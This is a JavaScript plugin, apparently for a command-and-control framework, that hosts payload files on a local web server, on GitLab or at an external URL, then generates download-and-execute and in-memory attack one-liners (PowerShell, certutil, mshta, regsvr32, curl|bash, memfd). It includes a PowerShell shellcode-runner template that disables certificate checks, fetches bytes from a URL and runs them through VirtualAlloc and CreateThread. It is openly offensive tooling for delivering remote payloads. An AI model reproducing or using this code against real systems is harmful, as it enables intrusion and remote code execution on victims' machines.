// ════════════════════════════════════════════════════════════════════════════
//  FileHost - Site Management
// ════════════════════════════════════════════════════════════════════════════

var W = {};
// Mutable UI/session state for the current client instance.
var STATE = {
    sites:               [],
    interfaces:          ["0.0.0.0"],
    pendingGitlabOperation: null,
    latestGitlabTokens:  {},
    gitlabTokenPromptOpen: false,
};

const SITE_TYPE_DEFAULT = 0;
const SITE_TYPE_GITLAB = 1;
const SITE_TYPE_EXTERNAL = 2;

const HOSTING_TYPE_ITEMS = ["Hosted", "GitLab", "External"];
const HOSTING_TYPE_EMOJIS = ["🏠", "🦊", "🌐"];

var CONTENT_TYPES = [
    "application/octet-stream",
    "text/html",
    "text/plain",
    "application/javascript",
    "application/x-msdownload",
    "application/hta",
    "application/xml",
    "text/xml",
    "text/css",
    "image/png",
    "image/jpeg",
    "application/pdf",
    "application/zip",
    "application/json",
    "image/gif",
    "image/svg+xml",
    "application/gzip",
];

var MIME_MAP = {
    ".bin":  "application/octet-stream",
    ".exe":  "application/x-msdownload",
    ".dll":  "application/x-msdownload",
    ".sys":  "application/octet-stream",
    ".o":    "application/octet-stream",
    ".so":   "application/octet-stream",
    ".ps1":  "text/plain",
    ".bat":  "text/plain",
    ".cmd":  "text/plain",
    ".vbs":  "text/plain",
    ".sh":   "text/plain",
    ".py":   "text/plain",
    ".js":   "application/javascript",
    ".html": "text/html",
    ".htm":  "text/html",
    ".hta":  "application/hta",
    ".sct":  "text/xml",
    ".xml":  "application/xml",
    ".css":  "text/css",
    ".txt":  "text/plain",
    ".json": "application/json",
    ".pdf":  "application/pdf",
    ".png":  "image/png",
    ".jpg":  "image/jpeg",
    ".jpeg": "image/jpeg",
    ".gif":  "image/gif",
    ".svg":  "image/svg+xml",
    ".zip":  "application/zip",
    ".gz":   "application/gzip",
    ".tar":  "application/octet-stream",
    ".7z":   "application/octet-stream",
    ".rar":  "application/octet-stream",
};

var ATTACK_CATEGORIES = [
    { key: "download_exec", display: "Download & Execute" },
    { key: "in_memory",     display: "In-Memory Execution" },
    { key: "shellcode",     display: "Shellcode Execution" },
    { key: "custom",        display: "Custom Script" },
];

var ATTACK_METHODS = {
    download_exec: [
        { key: "powershell_download", display: "PowerShell Download + Exec" },
        { key: "certutil",            display: "certutil" },
        { key: "curl_exe",            display: "curl Download + Exec" },
        { key: "curl_bash",           display: "curl | bash (Linux)" },
        { key: "wget",                display: "wget (Linux)" },
        { key: "bitsadmin",           display: "bitsadmin (no SSL bypass)" },
    ],
    in_memory: [
        { key: "powershell_iex",      display: "PowerShell IEX" },
        { key: "powershell_iwr",      display: "PowerShell IWR" },
        { key: "mshta",               display: "mshta (HTA, no SSL bypass)" },
        { key: "regsvr32",            display: "regsvr32 (.sct, no SSL bypass)" },
        { key: "rundll32",            display: "rundll32 (JS)" },
        { key: "cscript",             display: "cscript (JS)" },
    ],
    shellcode: [
        { key: "psh_shellcode",       display: "PowerShell VirtualAlloc" },
        { key: "psh_fiber",            display: "PowerShell Fiber" },
        { key: "psh_syscall_inject",  display: "PowerShell Nt Syscalls" },
        { key: "linux_memfd",         display: "Linux /dev/shm exec" },
        { key: "linux_memfd_python",  display: "Linux memfd_create (Python)" },
    ],
    custom: [],
};

var CUSTOM_TEMPLATE = "# Custom Shellcode Runner\n# Click \"Generate\" to replace {{URL}} with the target URL\n# Or edit this script freely\n\n[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\n$url = \"{{URL}}\"\n$wc = New-Object Net.WebClient\n$bytes = $wc.DownloadData($url)\n\n# --- Your execution logic here ---\n# Example:\n# $k = Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr w,uint x,uint y,uint z);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -PassThru\n# $m = $k::VirtualAlloc(0,$bytes.Length,0x3000,0x40)\n# [Runtime.InteropServices.Marshal]::Copy($bytes,0,$m,$bytes.Length)\n# $k::CreateThread(0,0,$m,0,0,0)\n# [Threading.Thread]::Sleep(-1)\n";

// ── Shared Utility Helpers ──────────────────────────────────────────────────

function detectMimeType(filename) {
    if (!filename) return "application/octet-stream";
    var name = filename.toLowerCase();
    var dot = name.lastIndexOf(".");
    if (dot < 0) return "application/octet-stream";
    var ext = name.substring(dot);
    return MIME_MAP[ext] || "application/octet-stream";
}

function getSiteByKey(siteKey) {
    for (let i = 0; i < STATE.sites.length; i++) {
        if (STATE.sites[i].site_key === siteKey) {
            return STATE.sites[i];
        }
    }
    return null;
}

// ── GitLab Token / Retry Helpers ────────────────────────────────────────────

function setPendingGitlabRetry(command, host, payload) {
    STATE.pendingGitlabOperation = {
        command: command,
        host: (host || "").trim(),
        payload: payload,
    };
}

function retryPendingGitlabOperation(host) {
    let cleanHost = (host || "").trim();
    let pending = STATE.pendingGitlabOperation;
    if (!pending || pending.host !== cleanHost) return;

    if (pending.command === "host_gitlab_file") {
        let latestToken = STATE.latestGitlabTokens[cleanHost];
        if (latestToken && pending.payload) {
            pending.payload.access_token = latestToken;
        }
    }
    STATE.pendingGitlabOperation = null;
    ax.service_command("FileHost", pending.command, pending.payload);
}

function promptGitlabTokenUpdate(host) {
    if (STATE.gitlabTokenPromptOpen) {
        return false;
    }
    let cleanHost = (host || "").trim();
    if (cleanHost.length === 0) {
        return false;
    }
    STATE.gitlabTokenPromptOpen = true;

    let title = "GitLab Token Required";
    let msg = "Authentication failed for " + cleanHost;

    let label = form.create_label(msg + "\nEnter updated access token:");
    let tokenInput = form.create_textline("");
    tokenInput.setPlaceholder("GitLab access token");

    let layout = form.create_vlayout();
    layout.addWidget(label);
    layout.addWidget(tokenInput);

    let dialog = form.create_dialog(title);
    dialog.setLayout(layout);
    dialog.setButtonsText("Update Token", "Cancel");
    if (!dialog.exec()) {
        STATE.gitlabTokenPromptOpen = false;
        return false;
    }

    let token = (tokenInput.text() || "").trim();
    if (token.length === 0) {
        STATE.gitlabTokenPromptOpen = false;
        return false;
    }
    STATE.latestGitlabTokens[cleanHost] = token;
    if (W.gitlabHostInput && W.gitlabTokenInput) {
        let currentHost = (W.gitlabHostInput.text() || "").trim();
        if (currentHost === cleanHost) {
            W.gitlabTokenInput.setText(token);
        }
    }

    ax.service_command("FileHost", "update_gitlab_token", {
        host: cleanHost,
        access_token: token,
        retry_pending: true,
    });
    STATE.gitlabTokenPromptOpen = false;
    return true;
}

// ── Entry ────────────────────────────────────────────────────────────────────

function InitService() {
    let hostAction = menu.create_action("Host File...", function() {
        showHostFileDialog();
    });
    let manageAction = menu.create_action("Manage", function() {
        showManageDialog();
    });
    let attackAction = menu.create_action("Attacks...", function() {
        showAttacksDialog();
    });

    let sitesMenu = menu.create_menu("Site Management");
    sitesMenu.addItem(hostAction);
    sitesMenu.addItem(attackAction);
    sitesMenu.addItem(menu.create_separator());
    sitesMenu.addItem(manageAction);
    menu.add_main(sitesMenu);

    ax.service_command("FileHost", "list_sites", {});
}

// ── Data Handler ─────────────────────────────────────────────────────────────

function data_handler(data) {
    let r;
    try { r = JSON.parse(data); } catch(e) { return; }

    switch (r.action) {

        case "sites_list":
            STATE.sites = r.sites || [];
            STATE.interfaces = r.interfaces || ["0.0.0.0"];
            refreshSiteTable();
            break;

        case "site_added":
            STATE.sites.push({
                site_key:     r.site_key,
                uri:          r.uri,
                host:         r.host,
                port:         r.port,
                ssl:          r.ssl,
                content_type: r.content_type,
                file_name:    r.file_name,
                file_size:    r.file_size,
                one_shot:     r.one_shot,
                created_by:   r.created_by,
                created_at:   r.created_at,
                downloads:    0,
                url:          r.url,
                type:         r.type,
            });
            if (r.type === SITE_TYPE_GITLAB && STATE.pendingGitlabOperation && STATE.pendingGitlabOperation.command === "host_gitlab_file") {
                STATE.pendingGitlabOperation = null;
            }
            refreshSiteTable();
            ax.show_message("File Hosted", "Type: " + HOSTING_TYPE_ITEMS[r.type] + "\nURL: " + r.url + "\nSize: " + ax.format_size(r.file_size) + "\nContent-Type: " + r.content_type + (r.one_shot ? "\nOne-shot: Yes" : ""));
            break;

        case "site_removed":
            for (let i = 0; i < STATE.sites.length; i++) {
                if (STATE.sites[i].site_key === r.site_key) {
                    STATE.sites.splice(i, 1);
                    break;
                }
            }
            if (STATE.pendingGitlabOperation && STATE.pendingGitlabOperation.command === "remove_site" &&
                STATE.pendingGitlabOperation.payload && STATE.pendingGitlabOperation.payload.site_key === r.site_key) {
                STATE.pendingGitlabOperation = null;
            }
            refreshSiteTable();
            break;

        case "download_event":
            for (let j = 0; j < STATE.sites.length; j++) {
                if (STATE.sites[j].site_key === r.site_key) {
                    STATE.sites[j].downloads = r.count;
                    break;
                }
            }
            refreshSiteTable();
            break;

        case "attack_generated":
            if (W.attackResult) {
                W.attackResult.setText(r.script);
            }
            break;

        case "gitlab_token_value":
            if (W.gitlabTokenInput && W.gitlabHostInput) {
                let currentHost = (W.gitlabHostInput.text() || "").trim();
                if (currentHost === r.host) {
                    W.gitlabTokenInput.setText(r.access_token || "");
                }
            }
            break;
        case "gitlab_token_required":
            promptGitlabTokenUpdate(r.host);
            break;
        case "gitlab_token_updated":
            if (r.retry_pending) {
                retryPendingGitlabOperation(r.host);
            }
            break;

        case "error":
            ax.show_message("FileHost Error", r.message || "Unknown error");
            break;
    }
}

// ── Hosting Dialog (Hosted + GitLab) ────────────────────────────────────────
function getHostedFileParams(container) {
    let labelURI  = form.create_label("URI Path:");
    let textURI   = form.create_textline("/hosted/payload.bin");
    container.put("hosted_uri", textURI);

    let labelHost = form.create_label("Bind Host:");
    let comboHost = form.create_combo();
    for (let idx = 0; idx < STATE.interfaces.length; idx++) {
        comboHost.addItem(STATE.interfaces[idx]);
    }
    comboHost.setCurrentIndex(0);
    container.put("hosted_bindHost", comboHost);

    let labelPort = form.create_label("Port:");
    let spinPort  = form.create_spin();
    spinPort.setRange(1, 65535);
    spinPort.setValue(8080);
    container.put("hosted_port", spinPort);

    let labelCT   = form.create_label("Content-Type:");
    let comboCT   = form.create_combo();
    comboCT.addItems(CONTENT_TYPES);
    comboCT.setCurrentIndex(0);
    container.put("hosted_contentType", comboCT);

    let labelFN   = form.create_label("Download Name:");
    let textFN    = form.create_textline("");
    textFN.setPlaceholder("Optional filename for Content-Disposition");
    container.put("hosted_fileName", textFN);

    let checkSSL     = form.create_check("Enable SSL/TLS");
    let checkOneShot = form.create_check("One-shot (serve once, then remove)");
    container.put("hosted_ssl", checkSSL);
    container.put("hosted_oneShot", checkOneShot);

    let grid = form.create_gridlayout();
    grid.addWidget(labelURI,      0, 0, 1, 1);
    grid.addWidget(textURI,       0, 1, 1, 3);
    grid.addWidget(labelHost,     1, 0, 1, 1);
    grid.addWidget(comboHost,     1, 1, 1, 3);
    grid.addWidget(labelPort,     2, 0, 1, 1);
    grid.addWidget(spinPort,      2, 1, 1, 1);
    grid.addWidget(labelCT,       3, 0, 1, 1);
    grid.addWidget(comboCT,       3, 1, 1, 3);
    grid.addWidget(labelFN,       4, 0, 1, 1);
    grid.addWidget(textFN,        4, 1, 1, 3);
    grid.addWidget(checkSSL,      5, 0, 1, 2);
    grid.addWidget(checkOneShot,  5, 2, 1, 2);

    let panel = form.create_panel();
    panel.setLayout(grid);

    return panel;
}

function getGitlabParams(container) {
    let labelHost  = form.create_label("GitLab Host:");
    let textHost   = form.create_textline("gitlab.com");
    W.gitlabHostInput = textHost;
    container.put("gitlab_host", textHost);

    let labelToken = form.create_label("Access Token:");
    let textToken  = form.create_textline("");
    W.gitlabTokenInput = textToken;
    container.put("gitlab_token", textToken);

    let labelProject = form.create_label("Project ID:");
    let textProject  = form.create_textline("");
    container.put("gitlab_project", textProject);

    let labelCT   = form.create_label("Content-Type:");
    let comboCT   = form.create_combo();
    comboCT.addItems(CONTENT_TYPES);
    comboCT.setCurrentIndex(0);
    container.put("gitlab_contentType", comboCT);

    let labelFN   = form.create_label("Download Name:");
    let textFN    = form.create_textline("");
    textFN.setPlaceholder("Optional filename for Content-Disposition");
    container.put("gitlab_fileName", textFN);

    let grid = form.create_gridlayout();
    grid.addWidget(labelHost,     0, 0, 1, 1);
    grid.addWidget(textHost,      0, 1, 1, 3);
    grid.addWidget(labelToken,    1, 0, 1, 1);
    grid.addWidget(textToken,     1, 1, 1, 3);
    grid.addWidget(labelProject,  2, 0, 1, 1);
    grid.addWidget(textProject,   2, 1, 1, 3);
    grid.addWidget(labelCT,       3, 0, 1, 1);
    grid.addWidget(comboCT,       3, 1, 1, 3);
    grid.addWidget(labelFN,       4, 0, 1, 1);
    grid.addWidget(textFN,        4, 1, 1, 3);

    let panel = form.create_panel();
    panel.setLayout(grid);

    form.connect(textHost, "editingFinished", function() {
        let host = (textHost.text() || "").trim();
        textHost.setText(host);
        textToken.setText("");
        if (host.length === 0) {
            return;
        }
        ax.service_command("FileHost", "get_gitlab_token", { host: host });
    });

    ax.service_command("FileHost", "get_gitlab_token", { host: (textHost.text() || "").trim() });

    return panel;
}

function getExternalParams(container) {
    let labelURL  = form.create_label("External URL:");
    let textURL   = form.create_textline("");
    container.put("external_url", textURL);

    let grid = form.create_gridlayout();
    grid.addWidget(labelURL,      0, 0, 1, 1);
    grid.addWidget(textURL,       0, 1, 1, 3);

    let panel = form.create_panel();
    panel.setLayout(grid);

    return panel;
}

function showHostFileDialog() {
    let container = form.create_container();
    let labelFile = form.create_label("File:");
    let filePath  = form.create_label("<i style='color:#888'>No file selected</i>");
    let browseBtn = form.create_button("Browse...");
    var selectedPath = "";


    let labelConf = form.create_label("Hosting Type:");
    let comboConf = form.create_combo();
    comboConf.setItems(HOSTING_TYPE_ITEMS);

    let stack = form.create_stack();
    stack.addPage(getHostedFileParams(container), HOSTING_TYPE_ITEMS[SITE_TYPE_DEFAULT] + " Options");
    stack.addPage(getGitlabParams(container), HOSTING_TYPE_ITEMS[SITE_TYPE_GITLAB] + " Options");
    stack.addPage(getExternalParams(container), HOSTING_TYPE_ITEMS[SITE_TYPE_EXTERNAL] + " Options");

    form.connect(comboConf, "currentIndexChanged", function(idx) {
        stack.setCurrentIndex(idx);
    });

    form.connect(browseBtn, "clicked", function() {
        let path = ax.prompt_open_file("Select file to host", "All Files (*)");
        if (path && path.length > 0) {
            selectedPath = path;
            let basename = ax.file_basename(path);
            filePath.setText(basename + " (" + ax.format_size(ax.file_size(path)) + ")");

            container.get("hosted_uri").setText("/hosted/" + basename);
            container.get("hosted_fileName").setText(basename);
            container.get("gitlab_fileName").setText(basename);

            let detectedMime = detectMimeType(basename);
            for (let k = 0; k < CONTENT_TYPES.length; k++) {
                if (CONTENT_TYPES[k] === detectedMime) {
                    container.get("hosted_contentType").setCurrentIndex(k);
                    container.get("gitlab_contentType").setCurrentIndex(k);
                    break;
                }
            }
        }
    });

    let grid = form.create_gridlayout();
    grid.addWidget(labelFile,     0, 0, 1, 1);
    grid.addWidget(browseBtn,     0, 1, 1, 1);
    grid.addWidget(filePath,      0, 2, 1, 2);
    grid.addWidget(labelConf,     1, 0, 1, 1);
    grid.addWidget(comboConf,     1, 1, 1, 3);
    grid.addWidget(stack,         2, 0, 1, 4);

    let dialog = form.create_dialog("Host File");
    dialog.setSize(600, 300);
    dialog.setLayout(grid);
    dialog.setButtonsText("Host", "Cancel");

    if (!dialog.exec()) return;
    let hostedType = comboConf.currentIndex();

    if( hostedType !== SITE_TYPE_EXTERNAL ) {   // Do not handle uploading to an external URL, just pass the URL to the service
        if (!selectedPath || selectedPath.length === 0) {
            ax.show_message("FileHost", "No file selected.");
            return;
        }

        let fileB64 = ax.file_read(selectedPath);
        if (!fileB64 || fileB64.length === 0) {
            ax.show_message("FileHost", "Failed to read file.");
            return;
        }
    }

    if(hostedType === SITE_TYPE_DEFAULT) {
        let uri = container.get("hosted_uri").text();
        if (!uri || uri.length === 0) {
            ax.show_message("FileHost", "URI path is required.");
            return;
        }

        ax.service_command("FileHost", "host_file", {
            uri:          uri,
            host:         container.get("hosted_bindHost").currentText(),
            port:         container.get("hosted_port").value(),
            ssl:          container.get("hosted_ssl").isChecked(),
            content_type: container.get("hosted_contentType").currentText(),
            file_name:    container.get("hosted_fileName").text(),
            file_b64:     fileB64,
            one_shot:     container.get("hosted_oneShot").isChecked(),
        });
    } else if(hostedType === SITE_TYPE_GITLAB) {
        let host = (container.get("gitlab_host").text() || "").trim();
        let token = container.get("gitlab_token").text();
        if (!host || host.length === 0 || !token || token.length === 0) {
            ax.show_message("FileHost", "GitLab host and access token are required.");
            return;
        }

        let gitlabUploadReq = {
            host:           host,
            access_token:   container.get("gitlab_token").text(),
            project:        container.get("gitlab_project").text(),
            content_type:   container.get("gitlab_contentType").currentText(),
            file_name:      container.get("gitlab_fileName").text(),
            file_b64:       fileB64,
        };
        setPendingGitlabRetry("host_gitlab_file", host, gitlabUploadReq);
        ax.service_command("FileHost", "host_gitlab_file", gitlabUploadReq);

        ax.service_command("FileHost", "update_gitlab_token", {
            host:           host,
            access_token:   container.get("gitlab_token").text(), 
        });
    } else if (hostedType === SITE_TYPE_EXTERNAL) {
        let url = container.get("external_url").text();
        if (!url || url.length === 0) {
            ax.show_message("FileHost", "External URL is required.");
            return;
        }
        ax.service_command("FileHost", "host_external_url", { url: url });
    }
}

// ── Site Management Dialog ──────────────────────────────────────────────────

function showManageDialog() {
    W.siteTable = form.create_table(["Type", "URI", "Host", "Port", "SSL", "Content-Type", "Size", "Downloads", "One-Shot", "Created By", "URL"]);
    W.siteTable.setSortingEnabled(true);
    refreshSiteTable();

    let removeBtn  = form.create_button("Remove Selected");
    let copyUrlBtn = form.create_button("Copy URL");
    let refreshBtn = form.create_button("Refresh");

    form.connect(removeBtn, "clicked", function() {
        let rows = W.siteTable.selectedRows();
        if (rows.length === 0) return;
        for (let i = 0; i < rows.length; i++) {
            let uri  = W.siteTable.text(rows[i], 1);
            let host = W.siteTable.text(rows[i], 2);
            let port = W.siteTable.text(rows[i], 3);
            let siteKey = host + ":" + port + uri;
            let site = getSiteByKey(siteKey);
            if (site && site.type === SITE_TYPE_GITLAB) {
                setPendingGitlabRetry("remove_site", site.host, { site_key: siteKey });
            }
            ax.service_command("FileHost", "remove_site", { site_key: siteKey });
        }
    });

    form.connect(copyUrlBtn, "clicked", function() {
        let rows = W.siteTable.selectedRows();
        if (rows.length === 0) return;
        let url = W.siteTable.text(rows[0], 10);
        ax.copy_to_clipboard(url);
    });

    form.connect(refreshBtn, "clicked", function() {
        ax.service_command("FileHost", "list_sites", {});
    });

    let btnLayout = form.create_hlayout();
    btnLayout.addWidget(removeBtn);
    btnLayout.addWidget(copyUrlBtn);
    btnLayout.addWidget(form.create_hspacer());
    btnLayout.addWidget(refreshBtn);
    let btnPanel = form.create_panel();
    btnPanel.setLayout(btnLayout);

    let mainLayout = form.create_vlayout();
    mainLayout.addWidget(W.siteTable);
    mainLayout.addWidget(btnPanel);

    let dialog = form.create_dialog("Site Management");
    dialog.setSize(950, 500);
    dialog.setLayout(mainLayout);
    dialog.exec();

    W.siteTable = null;
}

// ── Attacks Dialog ──────────────────────────────────────────────────────────

function showAttacksDialog() {
    let labelSite = form.create_label("Hosted Site:");
    let comboSite = form.create_combo();
    var siteURLs = [];
    for (let i = 0; i < STATE.sites.length; i++) {
        let s = STATE.sites[i];
        comboSite.addItem(s.uri + "  (" + s.host + ":" + s.port + ")");
        siteURLs.push(s.url);
    }
    if (siteURLs.length === 0) {
        comboSite.addItem("(no hosted sites)");
    }

    let labelURL = form.create_label("Target URL:");
    let textURL = form.create_textline("");
    textURL.setPlaceholder("Select a hosted site or enter URL manually");
    if (siteURLs.length > 0) {
        textURL.setText(siteURLs[0]);
    }

    form.connect(comboSite, "currentIndexChanged", function(idx) {
        if (idx >= 0 && idx < siteURLs.length) {
            textURL.setText(siteURLs[idx]);
        }
    });

    let labelCat = form.create_label("Category:");
    let comboCat = form.create_combo();
    for (let i = 0; i < ATTACK_CATEGORIES.length; i++) {
        comboCat.addItem(ATTACK_CATEGORIES[i].display);
    }

    let labelMethod = form.create_label("Method:");
    let comboMethod = form.create_combo();
    let initMethods = ATTACK_METHODS[ATTACK_CATEGORIES[0].key];
    for (let i = 0; i < initMethods.length; i++) {
        comboMethod.addItem(initMethods[i].display);
    }

    let checkEnc = form.create_check("Base64 Encode (-enc)");

    let labelResult = form.create_label("Payload:");
    W.attackResult = form.create_textmulti("");
    W.attackResult.setReadOnly(true);
    W.attackResult.setPlaceholder("Click Generate to create the attack payload");

    form.connect(comboCat, "currentIndexChanged", function(catIdx) {
        let catKey = ATTACK_CATEGORIES[catIdx].key;
        if (catKey === "custom") {
            comboMethod.clear();
            comboMethod.setEnabled(false);
            W.attackResult.setReadOnly(false);
            W.attackResult.setText(CUSTOM_TEMPLATE);
        } else {
            comboMethod.setEnabled(true);
            W.attackResult.setReadOnly(true);
            W.attackResult.setText("");
            let methods = ATTACK_METHODS[catKey];
            comboMethod.clear();
            for (let i = 0; i < methods.length; i++) {
                comboMethod.addItem(methods[i].display);
            }
        }
    });

    let genBtn  = form.create_button("Generate");
    let copyBtn = form.create_button("Copy to Clipboard");

    form.connect(genBtn, "clicked", function() {
        let url = textURL.text();
        if (!url || url.length === 0) {
            ax.show_message("FileHost", "Target URL is required.");
            return;
        }

        let catIdx = comboCat.currentIndex();
        let catKey = ATTACK_CATEGORIES[catIdx].key;

        if (catKey === "custom") {
            let template = W.attackResult.text();
            let result = template.split("{{URL}}").join(url);
            W.attackResult.setText(result);
        } else {
            let methods = ATTACK_METHODS[catKey];
            let methodIdx = comboMethod.currentIndex();
            if (methodIdx < 0 || methodIdx >= methods.length) return;
            ax.service_command("FileHost", "generate_attack", {
                url:     url,
                method:  methods[methodIdx].key,
                encoded: checkEnc.isChecked(),
            });
        }
    });

    form.connect(copyBtn, "clicked", function() {
        let text = W.attackResult.text();
        if (text && text.length > 0) {
            ax.copy_to_clipboard(text);
        }
    });

    let grid = form.create_gridlayout();
    grid.addWidget(labelSite,       0, 0, 1, 1);
    grid.addWidget(comboSite,       0, 1, 1, 3);
    grid.addWidget(labelURL,        1, 0, 1, 1);
    grid.addWidget(textURL,         1, 1, 1, 3);
    grid.addWidget(labelCat,        2, 0, 1, 1);
    grid.addWidget(comboCat,        2, 1, 1, 3);
    grid.addWidget(labelMethod,     3, 0, 1, 1);
    grid.addWidget(comboMethod,     3, 1, 1, 3);
    grid.addWidget(checkEnc,        4, 1, 1, 3);
    grid.addWidget(labelResult,     5, 0, 1, 1);
    grid.addWidget(W.attackResult,  5, 1, 1, 3);
    grid.addWidget(genBtn,          6, 1, 1, 1);
    grid.addWidget(copyBtn,         6, 2, 1, 1);

    let dialog = form.create_dialog("Scripted Web Delivery");
    dialog.setSize(750, 400);
    dialog.setLayout(grid);
    dialog.exec();

    W.attackResult = null;
}

function FinalizeService() {
    W.gitlabTokenInput = null;
    W.gitlabHostInput = null;
}

// ── Table Rendering Helpers ─────────────────────────────────────────────────

function refreshSiteTable() {
    if (!W.siteTable) return;
    W.siteTable.clear();

    for (let i = 0; i < STATE.sites.length; i++) {
        let s = STATE.sites[i];
        W.siteTable.addItem([
            HOSTING_TYPE_EMOJIS[s.type],
            s.uri,
            s.host || "",
            String(s.port || 0),
            s.ssl ? "Yes" : "No",
            s.content_type,
            ax.format_size(s.file_size),
            String(s.downloads),
            s.one_shot ? "Yes" : "No",
            s.created_by || "",
            s.url || "",
        ]);
    }
}
